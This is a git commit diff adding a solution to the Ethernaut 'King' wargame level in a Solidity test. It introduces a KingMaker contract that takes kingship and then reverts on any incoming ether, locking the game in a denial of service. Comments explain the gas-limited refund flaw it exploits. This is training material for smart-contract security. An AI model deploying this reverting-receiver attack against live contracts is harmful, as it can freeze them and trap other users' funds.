be5d70e0326f3c35d4d988ed347cccaf92d9025b
oba <obatirou@gmail.com>
2023-04-20 09:45:31 +0200

    Level 9 King: solution

--- src/test/King.t.sol
+++ src/test/King.t.sol
@@ -22,12 +22,24 @@ contract KingTest is Test {
         KingFactory kingFactory = new KingFactory();
         ethernaut.registerLevel(kingFactory);
         vm.startPrank(attacker);
-        address levelAddress = ethernaut.createLevelInstance(kingFactory);
+        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(kingFactory);
         King ethernautKing = King(payable(levelAddress));
 
         //////////////////
         // LEVEL ATTACK //
         //////////////////
+
+        // In the King contract, in receive function,
+        // When someone claim Kingship, the contract will
+        // return funds to last king by calling transfer
+        // but transfer is limited to 2300 unit of gas
+        // and a revert in the receive function of the last king
+        // allows to not accept it.
+
+        // Make an attack contract and send ether to it
+        KingMaker kingMaker = new KingMaker{value: 0.01 ether}(address(ethernautKing));
+        // Claim kingship
+        kingMaker.beKing();
 
         //////////////////////
         // LEVEL SUBMISSION //
@@ -35,5 +47,22 @@ contract KingTest is Test {
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract KingMaker {
+    address payable king;
+
+    constructor(address _king) public payable {
+        require(_king.code.length > 0, "Not a contract");
+        king = payable(_king);
+    }
+
+    function beKing() external {
+        king.call{value: 0.01 ether}("");
+    }
+
+    receive() external payable {
+        revert("I do not accept ether in receive");
     }
 }
